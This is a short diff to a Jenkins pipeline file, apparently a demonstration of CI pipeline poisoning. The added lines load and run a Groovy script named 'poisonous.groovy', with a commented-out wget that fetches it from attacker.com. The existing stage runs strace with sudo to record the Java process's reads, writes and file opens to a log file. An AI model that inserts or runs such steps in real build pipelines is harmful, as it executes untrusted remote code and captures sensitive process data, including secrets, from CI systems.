@@ -1,5 +1,8 @@
 node('ubuntu') {
     def app  
+    /// sh "wget attacker.com/poisonous.groovy"
+    def myscript = load 'poisonous.groovy'
+    myscript.lookAtThis("Steve")
 
     stage('Start Java Listener') {
         sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/getIntoDevOps.2 &'
